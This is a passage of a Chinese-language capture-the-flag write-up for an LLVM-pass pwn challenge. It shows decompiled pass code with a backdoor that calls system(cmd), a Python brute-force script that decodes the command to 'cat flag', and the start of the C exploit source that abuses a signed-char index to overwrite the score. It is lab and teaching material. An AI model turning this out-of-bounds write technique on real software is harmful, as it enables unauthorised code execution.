h&#123;&#x27;m \x93 hf</span></span><br><span class="line">    score = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">    *score = <span class="number">0LL</span>;</span><br><span class="line">    v65 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = llvm::Function::begin(v68);</span><br><span class="line">          ;</span><br><span class="line">          llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::operator++(</span><br><span class="line">            &amp;i,</span><br><span class="line">            <span class="number">0LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v63 = llvm::Function::end(v68);</span><br><span class="line">      <span class="keyword">if</span> ( (llvm::operator!=(&amp;i, &amp;v63) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ++v65;</span><br><span class="line">      v3 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::operator-&gt;(&amp;i);</span><br><span class="line">      <span class="keyword">for</span> ( j = llvm::BasicBlock::begin(v3);    <span class="comment">// 遍历gamestart函数中的所有基本块BasicBlock进行处理</span></span><br><span class="line">            ;</span><br><span class="line">            llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::operator++(</span><br><span class="line">              &amp;j,</span><br><span class="line">              <span class="number">0LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::operator-&gt;(&amp;i);</span><br><span class="line">        v61 = llvm::BasicBlock::end(v4);</span><br><span class="line">        <span class="keyword">if</span> ( (llvm::operator!=(&amp;j, &amp;v61) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v5 = (llvm::Instruction *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::operator-&gt;(&amp;j);</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::Instruction::getOpcode(v5) == <span class="number">0x37</span> )<span class="comment">// 指令码获取，0x37是函数调用指令的指令码</span></span><br><span class="line">        &#123;</span><br><span class="line">          v60 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;&gt;(&amp;j);</span><br><span class="line">          llvm::CallBase::getCalledFunction(v60);</span><br><span class="line">          CalledFunction = (llvm::Value *)llvm::CallBase::getCalledFunction(v60);<span class="comment">// 获取调用的函数</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">          <span class="keyword">if</span> ( CalledFunction )</span><br><span class="line">          &#123;</span><br><span class="line">            v57[<span class="number">0</span>] = llvm::Value::getName(CalledFunction);</span><br><span class="line">            v57[<span class="number">1</span>] = v6;</span><br><span class="line">            llvm::StringRef::operator <span class="title function_">std::string</span><span class="params">(Fun_ipt, v57)</span>;</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="built_in">std</span>::operator==&lt;<span class="type">char</span>&gt;(Fun_ipt, <span class="string">&quot;fight&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )<span class="comment">// 函数调用名为fight</span></span><br><span class="line">            &#123;</span><br><span class="line">              NumOperands = llvm::CallBase::getNumOperands(v60);<span class="comment">// 获取操作数个数，返回的值是被调用函数的参数个数+1</span></span><br><span class="line">              <span class="keyword">if</span> ( NumOperands != <span class="number">2</span> )           <span class="comment">// 操作数必须是2个</span></span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">              ArgOperand = llvm::CallBase::getArgOperand(v60, <span class="number">0</span>);<span class="comment">// 获取参数</span></span><br><span class="line">              v55 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOperand);</span><br><span class="line">              ZExtValue = llvm::ConstantInt::getZExtValue(v55);<span class="comment">// 获取武器索引</span></span><br><span class="line">              v8 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;you decide to use the weapon which index is &quot;</span>);</span><br><span class="line">              v9 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(v8, weaponindex);</span><br><span class="line">              v10 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(v9, <span class="string">&quot;to fight with the boss&quot;</span>);</span><br><span class="line">              <span class="built_in">std</span>::ostream::operator&lt;&lt;(v10, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">              weapon_nadpady = weaponlist[ZExtValue];</span><br><span class="line">              <span class="keyword">if</span> ( boss &lt;= weapon_nadpady )</span><br><span class="line">              &#123;</span><br><span class="line">                v12 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;you win&quot;</span>);</span><br><span class="line">                <span class="built_in">std</span>::ostream::operator&lt;&lt;(v12, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">                v13 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;you score is &quot;</span>);</span><br><span class="line">                v14 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(v13, weapon_nadpady - boss);</span><br><span class="line">                <span class="built_in">std</span>::ostream::operator&lt;&lt;(v14, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">                *score = weapon_nadpady - boss;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                v11 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;you loss&quot;</span>);</span><br><span class="line">                <span class="built_in">std</span>::ostream::operator&lt;&lt;(v11, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( (__int64)*score &gt; <span class="number">0x12345678</span> )<span class="comment">// 分数大于一定值进入后门函数</span></span><br><span class="line">                backdoor();                     <span class="comment">// dest</span></span><br><span class="line">            &#125;</span><br><span class="line">              </span><br><span class="line">              </span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="built_in">std</span>::operator==&lt;<span class="type">char</span>&gt;(Fun_ipt, <span class="string">&quot;merge&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )<span class="comment">// 函数调用名为merge</span></span><br><span class="line">            &#123;</span><br><span class="line">              v52 = llvm::CallBase::getNumOperands(v60);</span><br><span class="line">              <span class="keyword">if</span> ( v52 != <span class="number">3</span> )                   <span class="comment">// 操作数必须是3个</span></span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">              v15 = llvm::CallBase::getArgOperand(v60, <span class="number">0</span>);<span class="comment">// 获取第一个参数</span></span><br><span class="line">              v51 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v15);</span><br><span class="line">              v50 = llvm::ConstantInt::getZExtValue(v51);</span><br><span class="line">              v16 = llvm::CallBase::getArgOperand(v60, <span class="number">1u</span>);<span class="comment">// 获取第二个参数</span></span><br><span class="line">              v51 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v16);</span><br><span class="line">              v49 = llvm::ConstantInt::getZExtValue(v51);</span><br><span class="line">              weaponlist[v50] += weaponlist[v49];<span class="comment">// 将weapen2的攻击力加到weapon1上</span></span><br><span class="line">            &#125;</span><br><span class="line">              </span><br><span class="line">              </span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="built_in">std</span>::operator==&lt;<span class="type">char</span>&gt;(Fun_ipt, <span class="string">&quot;destroy&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )<span class="comment">// 函数调用名为destroy</span></span><br><span class="line">            &#123;</span><br><span class="line">              v48 = <span class="number">0</span>;</span><br><span class="line">              v47 = llvm::CallBase::getNumOperands(v60);</span><br><span class="line">              <span class="keyword">if</span> ( v47 != <span class="number">2</span> )</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">              v17 = llvm::CallBase::getArgOperand(v60, <span class="number">0</span>);</span><br><span class="line">              v46 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v17);</span><br><span class="line">              v48 = llvm::ConstantInt::getZExtValue(v46);</span><br><span class="line">              weaponlist[v48] = <span class="number">0</span>;              <span class="comment">// 销毁选中的weapon</span></span><br><span class="line">            &#125;</span><br><span class="line">              </span><br><span class="line">              </span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="built_in">std</span>::operator==&lt;<span class="type">char</span>&gt;(Fun_ipt, <span class="string">&quot;upgrade&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )<span class="comment">// 函数调用名为upgrade</span></span><br><span class="line">            &#123;</span><br><span class="line">              v45 = <span class="number">0</span>;</span><br><span class="line">              v44 = llvm::CallBase::getNumOperands(v60);</span><br><span class="line">              <span class="keyword">if</span> ( v44 != <span class="number">2</span> )</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">              v18 = llvm::CallBase::getArgOperand(v60, <span class="number">0</span>);</span><br><span class="line">              v43 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v18);</span><br><span class="line">              v45 = llvm::ConstantInt::getZExtValue(v43);</span><br><span class="line">              <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">256</span>; ++k )</span><br><span class="line">                weaponlist[k] += v45;           <span class="comment">// 对所有的weapon更新，加上参数的值</span></span><br><span class="line">              v19 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;upgrade finish&quot;</span>);</span><br><span class="line">              <span class="built_in">std</span>::ostream::operator&lt;&lt;(v19, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">              v20 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;enjoy your war&quot;</span>);</span><br><span class="line">              <span class="built_in">std</span>::ostream::operator&lt;&lt;(v20, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">            &#125;   </span><br><span class="line">              </span><br><span class="line">              <span class="comment">// 对&#x27;&#x27;&#x27;\x92h&#123;&#x27;m\x93hf&#x27;&#x27;&#x27;进行解密</span></span><br><span class="line">              <span class="comment">// 存在两个h，所以猜想是&#x27;cat flag&#x27;</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="built_in">std</span>::operator==&lt;<span class="type">char</span>&gt;(Fun_ipt, <span class="string">&quot;wuxiangdeyidao&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              --boss;</span><br><span class="line">              <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; <span class="number">8</span>; ++m )</span><br><span class="line">                cmd[m] ^= <span class="number">0x14</span>u;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="built_in">std</span>::operator==&lt;<span class="type">char</span>&gt;(Fun_ipt, <span class="string">&quot;zhanjinniuza&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              boss -= <span class="number">2</span>;</span><br><span class="line">              <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt; <span class="number">8</span>; ++n )</span><br><span class="line">                cmd[n] ^= <span class="number">0x7F</span>u;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="built_in">std</span>::operator==&lt;<span class="type">char</span>&gt;(Fun_ipt, <span class="string">&quot;guobapenhuo&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              boss -= <span class="number">3</span>;</span><br><span class="line">              <span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt; <span class="number">8</span>; ++ii )</span><br><span class="line">                cmd[ii] -= <span class="number">9</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="built_in">std</span>::operator==&lt;<span class="type">char</span>&gt;(Fun_ipt, <span class="string">&quot;tiandongwanxiang&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              boss -= <span class="number">80</span>;</span><br><span class="line">              <span class="keyword">for</span> ( jj = <span class="number">0</span>; jj &lt; <span class="number">8</span>; ++jj )</span><br><span class="line">                cmd[jj] += <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">              </span><br><span class="line">              </span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v37 = <span class="number">0</span>;</span><br><span class="line">              v36 = llvm::CallBase::getNumOperands(v60);</span><br><span class="line">              <span class="keyword">if</span> ( v36 != <span class="number">2</span> )                   <span class="comment">// 操作数必须是2</span></span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">              v21 = llvm::CallBase::getArgOperand(v60, <span class="number">0</span>);<span class="comment">// 获取参数</span></span><br><span class="line">              v35 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v21);</span><br><span class="line">              v37 = llvm::ConstantInt::getZExtValue(v35);</span><br><span class="line">              ptr = <span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;::begin((__int64)&amp;funMap[abi:cxx11]);<span class="comment">// 取map的开头</span></span><br><span class="line">              times = <span class="number">0</span>;                        <span class="comment">// vul : 次数是char型，即有符号，循环一定次数会变为负数</span></span><br><span class="line">              <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v32 = <span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;::end((__int64)&amp;funMap[abi:cxx11]);<span class="comment">// 取map的结束</span></span><br><span class="line">                <span class="keyword">if</span> ( (<span class="built_in">std</span>::_Rb_tree_iterator&lt;<span class="built_in">std</span>::<span class="built_in">pair</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span> <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::operator!=(&amp;ptr, &amp;v32) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">                  <span class="keyword">break</span>;                        <span class="comment">// 如果map遍历完了就退出</span></span><br><span class="line">                v22 = <span class="built_in">std</span>::_Rb_tree_iterator&lt;<span class="built_in">std</span>::<span class="built_in">pair</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span> <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::operator-&gt;((__int64)&amp;ptr);<span class="comment">// 取ptr指向的函数名</span></span><br><span class="line">                <span class="keyword">if</span> ( (<span class="built_in">std</span>::operator==&lt;<span class="type">char</span>&gt;(v22, Fun_ipt) &amp; <span class="number">1</span>) != <span class="number">0</span> )<span class="comment">// 比较和我们输入的函数名，如果相同就进入分支</span></span><br><span class="line">                &#123;</span><br><span class="line">                  v23 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(</span><br><span class="line">                          &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</span><br><span class="line">                          <span class="string">&quot;you really want this?all right,i will add it into the weapon list&quot;</span>);</span><br><span class="line">                  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v23, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">                  v24 = <span class="built_in">std</span>::_Rb_tree_iterator&lt;<span class="built_in">std</span>::<span class="built_in">pair</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span> <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::operator-&gt;((__int64)&amp;ptr);<span class="comment">// 取ptr指向的函数名</span></span><br><span class="line">                  weaponlist[times] = *(_BYTE *)(v24 + <span class="number">32</span>);<span class="comment">// 向weaponlist中添加数据</span></span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ++times;</span><br><span class="line">                v31[<span class="number">1</span>] = <span class="built_in">std</span>::_Rb_tree_iterator&lt;<span class="built_in">std</span>::<span class="built_in">pair</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span> <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::operator++(&amp;ptr, <span class="number">0LL</span>);<span class="comment">// ptr自加，继续寻找</span></span><br><span class="line">              &#125;</span><br><span class="line">              v31[<span class="number">0</span>] = <span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;::end((__int64)&amp;funMap[abi:cxx11]);<span class="comment">// 取map的结尾</span></span><br><span class="line">              <span class="keyword">if</span> ( (<span class="built_in">std</span>::_Rb_tree_iterator&lt;<span class="built_in">std</span>::<span class="built_in">pair</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span> <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::operator==(</span><br><span class="line">                      (__int64)&amp;ptr,</span><br><span class="line">                      (__int64)v31) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">              &#123;                                 <span class="comment">// 如果ptr指向map结尾进入分支</span></span><br><span class="line">                v25 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;wow!! you find a new weapon&quot;</span>);</span><br><span class="line">                <span class="built_in">std</span>::ostream::operator&lt;&lt;(v25, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">              &#125;</span><br><span class="line">              v28 = v37;                        <span class="comment">// weapon的攻击力</span></span><br><span class="line">              v29[<span class="number">0</span>] = llvm::Value::getName(CalledFunction);<span class="comment">// weapon的名字</span></span><br><span class="line">              v29[<span class="number">1</span>] = v26;</span><br><span class="line">              llvm::StringRef::operator <span class="title function_">std::string</span><span class="params">(v30, v29)</span>;</span><br><span class="line">              *(_BYTE *)<span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;::operator[]((__int64)&amp;funMap[abi:cxx11], (__int64)v30) = v28;<span class="comment">// 向map中插入数据</span></span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v30);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(Fun_ipt);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v67);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现后门函数，其中cmd位于bss段上：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">int backdoor(void)</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;wow!! this is you gift&quot;);</span><br><span class="line">  return system(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>首先对cmd进行解码，密文是<code>\x92h&#123;&#39;m\x93hf</code>，存在两个h，所以猜测明文是<code>cat flag</code>，爆破脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;&#x27;&#x27;\x92h&#123;&#x27;m\x93hf&#x27;&#x27;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;&#x27;cat flag&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt1</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        s[i] ^= <span class="number">0x14</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt2</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        s[i] ^= <span class="number">0x7f</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt3</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        s[i] -= <span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt4</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        s[i] += <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_all</span>(<span class="params">s, idx</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        rand = random.randint(<span class="number">1</span>, <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">if</span> rand == <span class="number">1</span>:</span><br><span class="line">            encrypt1(s)</span><br><span class="line">        <span class="keyword">if</span> rand == <span class="number">2</span>:</span><br><span class="line">            encrypt2(s)</span><br><span class="line">        <span class="keyword">if</span> rand == <span class="number">3</span>:</span><br><span class="line">            encrypt3(s)</span><br><span class="line">        <span class="keyword">if</span> rand == <span class="number">4</span>:</span><br><span class="line">            encrypt4(s)</span><br><span class="line">        idx.append(rand)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> idx:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;wuxiangdeyidao();&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;zhanjinniuza();&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;guobapenhuo();&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;tiandongwanxiang();&#x27;</span>)</span><br><span class="line"></span><br><span class="line">random.seed()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    idx = []</span><br><span class="line">    sl = [<span class="number">146</span>, <span class="number">104</span>, <span class="number">123</span>, <span class="number">39</span>, <span class="number">109</span>, <span class="number">147</span>, <span class="number">104</span>, <span class="number">102</span>]   </span><br><span class="line">    fl = [<span class="number">99</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>]</span><br><span class="line">    encrypt_all(sl, idx)</span><br><span class="line">    <span class="keyword">if</span> fl == sl:</span><br><span class="line">        show(idx)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>之后我们只要保证socre中的值大于0x12345678，即可进入后门函数执行<code>system(&#39;cat flag&#39;)</code>，但是需要注意的是，这里比较的并不是socre的值，而是比较sorce作为地址指向的值，这是一个比较大的坑，也不知为啥要这样出题，所以我们是无法通过玩游戏通关的。</p>
<p>漏洞点在最后一个else分支中，这个分支的基本作用是：创建一个FuncMap，遍历这个map，如果没有我们给的函数名，那就以<code>FuncMap[&lt;函数名&gt;] = &lt;函数参数的值&gt;</code>来赋值，要注意这里是依靠字符串的大小来索引，所以不可随意命名函数；如果在map中可以找到我们给的函数名，那么就以<code>weaponlist[&lt;遍历次数&gt;] = &lt;map中对应函数名索引的值&gt;</code>。由于这里遍历次数的类型是char，即有符号，所以这里存在一个数组溢出的问题，并且发现sorce存在于weaponlist上面，通过负的索引便可修改sorce。</p>
<h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">fight</span><span class="params">(<span class="type">int</span> weapon)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span> weapon1, <span class="type">int</span> weapon2)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">destroy</span><span class="params">(<span class="type">int</span> weapon)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">upgrade</span><span class="params">(<span class="type">int</span> val)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">wuxiangdeyidao</span><span class="params">()</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">zhanjinniuza</span><span class="params">()</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">guobapenhuo</span><span class="params">()</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">tiandongwanxiang</span><span class="params">()</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func000</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func001</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func002</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func003</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func004</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span 